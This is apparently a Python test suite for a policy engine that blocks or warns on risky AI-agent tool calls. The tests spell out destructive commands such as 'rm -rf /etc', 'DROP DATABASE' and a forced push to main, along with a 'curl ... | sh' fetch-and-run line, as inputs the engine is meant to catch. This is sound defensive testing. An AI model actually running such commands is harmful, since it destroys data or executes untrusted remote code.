"""Tests for Gate policy enforcement."""
from __future__ import annotations

import tempfile
from pathlib import Path

import north9.gate as gate
import north9.gate.mcp
from north9.gate.core import Policy, PolicyResult, Rule

# ---------------------------------------------------------------------------
# Rule.matches_tool
# ---------------------------------------------------------------------------


class TestRuleMatchesTool:
    def test_exact_match(self) -> None:
        rule = Rule("r", "bash", "", "block", "")
        assert rule.matches_tool("bash") is True

    def test_exact_no_match(self) -> None:
        rule = Rule("r", "bash", "", "block", "")
        assert rule.matches_tool("write_file") is False

    def test_wildcard_star(self) -> None:
        rule = Rule("r", "*", "", "block", "")
        assert rule.matches_tool("bash") is True
        assert rule.matches_tool("anything") is True

    def test_glob_prefix(self) -> None:
        rule = Rule("r", "bash*", "", "block", "")
        assert rule.matches_tool("bash") is True
        assert rule.matches_tool("bash_run") is True
        assert rule.matches_tool("write_file") is False

    def test_glob_suffix(self) -> None:
        rule = Rule("r", "*_file", "", "block", "")
        assert rule.matches_tool("write_file") is True
        assert rule.matches_tool("read_file") is True
        assert rule.matches_tool("bash") is False


# ---------------------------------------------------------------------------
# Rule.check
# ---------------------------------------------------------------------------


class TestRuleCheck:
    def test_match_returns_true(self) -> None:
        rule = Rule("r", "bash", r"rm -rf", "block", "dangerous!")
        matched, reason = rule.check("bash", {"command": "rm -rf /"})
        assert matched is True
        assert reason == "dangerous!"

    def test_no_match_returns_false(self) -> None:
        rule = Rule("r", "bash", r"rm -rf", "block", "dangerous!")
        matched, reason = rule.check("bash", {"command": "ls -la"})
        assert matched is False
        assert reason == ""

    def test_wrong_tool_returns_false(self) -> None:
        rule = Rule("r", "bash", r"rm -rf", "block", "dangerous!")
        matched, _reason = rule.check("write_file", {"command": "rm -rf /"})
        assert matched is False

    def test_case_insensitive(self) -> None:
        rule = Rule("r", "bash", r"DROP DATABASE", "block", "no drop")
        matched, _ = rule.check("bash", {"command": "drop database mydb"})
        assert matched is True

    def test_dotall_multiline(self) -> None:
        rule = Rule("r", "bash", r"dangerous", "block", "bad")
        matched, _ = rule.check("bash", {"command": "echo line1\ndangerous\necho line3"})
        assert matched is True


# ---------------------------------------------------------------------------
# Policy.evaluate
# ---------------------------------------------------------------------------


class TestPolicyEvaluate:
    def test_blocks_on_matching_rule(self) -> None:
        policy = Policy([Rule("no-rm", "bash", r"rm -rf /", "block", "no delete root")])
        result = policy.evaluate("bash", {"command": "rm -rf /"})
        assert result.blocked is True
        assert result.allowed is False
        assert result.rule is not None
        assert result.rule.name == "no-rm"
        assert "no delete root" in result.reason

    def test_allows_when_no_rules_match(self) -> None:
        policy = Policy([Rule("no-rm", "bash", r"rm -rf /", "block", "no delete root")])
        result = policy.evaluate("bash", {"command": "ls -la"})
        assert result.allowed is True
        assert result.blocked is False
        assert result.rule is None

    def test_allows_empty_policy(self) -> None:
        policy = Policy([])
        result = policy.evaluate("bash", {"command": "rm -rf /"})
        assert result.allowed is True

    def test_warn_only_rule_allows(self) -> None:
        """Warn decision should allow the call but the rule fires."""
        policy = Policy([Rule("curl-warn", "bash", r"curl.*\|.*sh", "warn", "careful!")])
        result = policy.evaluate("bash", {"command": "curl https://example.com | sh"})
        assert result.allowed is True  # warn rules do NOT block
        assert result.blocked is False

    def test_first_blocking_rule_wins(self) -> None:
        policy = Policy([
            Rule("first", "bash", r"dangerous", "block", "first rule"),
            Rule("second", "bash", r"dangerous", "block", "second rule"),
        ])
        result = policy.evaluate("bash", {"command": "dangerous"})
        assert result.blocked is True
        assert result.rule is not None
        assert result.rule.name == "first"

    def test_wrong_tool_not_matched(self) -> None:
        policy = Policy([Rule("no-rm", "bash", r"rm -rf", "block", "no rm")])
        result = policy.evaluate("write_file", {"path": "rm -rf"})
        assert result.allowed is True


# ---------------------------------------------------------------------------
# Policy.from_dict
# ---------------------------------------------------------------------------


class TestPolicyFromDict:
    def test_parses_rules(self) -> None:
        data = {
            "rules": [
                {"name": "r1", "tool": "bash", "match": "pattern", "decision": "block", "reason": "bad"},
                {"name": "r2", "tool": "*", "match": "other", "decision": "warn", "reason": "careful"},
            ]
        }
        policy = Policy.from_dict(data)
        assert len(policy.rules) == 2
        assert policy.rules[0].name == "r1"
        assert policy.rules[1].decision == "warn"

    def test_empty_rules(self) -> None:
        policy = Policy.from_dict({"rules": []})
        assert policy.rules == []

    def test_missing_fields_use_defaults(self) -> None:
        policy = Policy.from_dict({"rules": [{}]})
        assert len(policy.rules) == 1
        assert policy.rules[0].name == "unnamed"
        assert policy.rules[0].tool == "*"
        assert policy.rules[0].decision == "block"


# ---------------------------------------------------------------------------
# Policy.default
# ---------------------------------------------------------------------------


class TestPolicyDefault:
    def test_returns_non_empty(self) -> None:
        policy = Policy.default()
        assert len(policy.rules) > 0

    def test_has_rm_rf_rule(self) -> None:
        policy = Policy.default()
        names = {r.name for r in policy.rules}
        assert "no-rm-rf-root" in names

    def test_rm_rf_root_blocks_etc(self) -> None:
        """rm -rf /etc should be blocked (not /workspace)."""
        policy = Policy.default()
        result = policy.evaluate("bash", {"command": "rm -rf /etc"})
        assert result.blocked is True

    def test_rm_rf_workspace_allowed(self) -> None:
        """rm -rf /workspace/stuff should be allowed."""
        policy = Policy.default()
        result = policy.evaluate("bash", {"command": "rm -rf /workspace/stuff"})
        assert result.allowed is True

    def test_rm_rf_tmp_blocked(self) -> None:
        """rm -rf /tmp is NOT /workspace, should be blocked."""
        policy = Policy.default()
        result = policy.evaluate("bash", {"command": "rm -rf /tmp"})
        assert result.blocked is True

    def test_force_push_main_blocked(self) -> None:
        policy = Policy.default()
        result = policy.evaluate("bash", {"command": "git push --force origin main"})
        assert result.blocked is True

    def test_normal_push_allowed(self) -> None:
        policy = Policy.default()
        result = policy.evaluate("bash", {"command": "git push origin feature-branch"})
        assert result.allowed is True


# ---------------------------------------------------------------------------
# PolicyResult.blocked
# ---------------------------------------------------------------------------


class TestPolicyResult:
    def test_blocked_true_when_not_allowed(self) -> None:
        result = PolicyResult(allowed=False, reason="bad")
        assert result.blocked is True

    def test_blocked_false_when_allowed(self) -> None:
        result = PolicyResult(allowed=True)
        assert result.blocked is False


# ---------------------------------------------------------------------------
# MCP tools
# ---------------------------------------------------------------------------


class TestMCPTools:
    """Tests for the MCP tool functions."""

    def setup_method(self) -> None:
        """Reset global policy state before each test."""
        gate.mcp._policy = Policy.default()

    def test_gate_status(self) -> None:
        from north9.gate.mcp import gate_status
        output = gate_status()
        assert "Rules" in output
        assert "no-rm-rf-root" in output

    def test_gate_check_allows_safe_command(self) -> None:
        from north9.gate.mcp import gate_check
        result = gate_check("bash", '{"command": "ls -la"}')
        assert "ALLOW" in result

    def test_gate_check_allows_rm_rf_workspace(self) -> None:
        from north9.gate.mcp import gate_check
        # rm -rf /workspace/stuff should be allowed
        result = gate_check("bash", '{"command": "rm -rf /workspace/tmp"}')
        assert "ALLOW" in result

    def test_gate_check_blocks_rm_rf_etc(self) -> None:
        from north9.gate.mcp import gate_check
        # rm -rf /etc is outside /workspace — should block
        result = gate_check("bash", '{"command": "rm -rf /etc"}')
        assert "BLOCK" in result

    def test_gate_check_invalid_json(self) -> None:
        from north9.gate.mcp import gate_check
        result = gate_check("bash", "not-json")
        assert "Error" in result

    def test_gate_add_rule(self) -> None:
        from north9.gate.mcp import gate_add_rule
        result = gate_add_rule("test-rule", "bash", r"forbidden_cmd", "block", "no forbidden commands")
        assert "test-rule" in result
        assert "Added" in result

    def test_gate_add_rule_duplicate(self) -> None:
        from north9.gate.mcp import gate_add_rule
        gate_add_rule("dup-rule", "bash", r"pattern", "block", "reason")
        result = gate_add_rule("dup-rule", "bash", r"pattern", "block", "reason")
        assert "already exists" in result.lower() or "Error" in result

    def test_gate_add_rule_invalid_decision(self) -> None:
        from north9.gate.mcp import gate_add_rule
        result = gate_add_rule("r", "bash", r"x", "delete", "bad")
        assert "Error" in result

    def test_gate_remove_rule(self) -> None:
        from north9.gate.mcp import gate_add_rule, gate_remove_rule
        gate_add_rule("to-remove", "bash", r"remove_me", "block", "will be removed")
        result = gate_remove_rule("to-remove")
        assert "to-remove" in result
        assert "Removed" in result

    def test_gate_remove_nonexistent_rule(self) -> None:
        from north9.gate.mcp import gate_remove_rule
        result = gate_remove_rule("does-not-exist")
        assert "Error" in result or "not found" in result.lower()

    def test_gate_reload(self) -> None:
        from north9.gate.mcp import gate_reload
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False, encoding="utf-8"
        ) as tmp:
            import yaml
            yaml.dump(
                {
                    "rules": [
                        {
                            "name": "test-reload",
                            "tool": "bash",
                            "match": "reload_test",
                            "decision": "block",
                            "reason": "reload test",
                        }
                    ]
                },
                tmp,
            )
            tmp_path = tmp.name

        original_path = gate.mcp._policy_path
        try:
            gate.mcp._policy_path = tmp_path
            gate.mcp._policy = None  # force reload
            result = gate_reload()
            assert "1" in result
            assert "test-reload" in gate.mcp._policy.rules[0].name  # type: ignore[union-attr]
        finally:
            gate.mcp._policy_path = original_path
            Path(tmp_path).unlink(missing_ok=True)

    def test_gate_add_and_check_custom_rule(self) -> None:
        """Add a rule then verify gate_check enforces it."""
        from north9.gate.mcp import gate_add_rule, gate_check
        gate_add_rule("no-secrets", "write_file", r"password=", "block", "No passwords in files")
        result = gate_check("write_file", '{"path": "config.txt", "content": "password=hunter2"}')
        assert "BLOCK" in result

    def test_gate_remove_restores_allow(self) -> None:
        """After removing a rule, the same call should pass."""
        from north9.gate.mcp import gate_add_rule, gate_check, gate_remove_rule
        gate_add_rule("no-echo", "bash", r"echo hello", "block", "no echo")
        assert "BLOCK" in gate_check("bash", '{"command": "echo hello"}')
        gate_remove_rule("no-echo")
        assert "ALLOW" in gate_check("bash", '{"command": "echo hello"}')
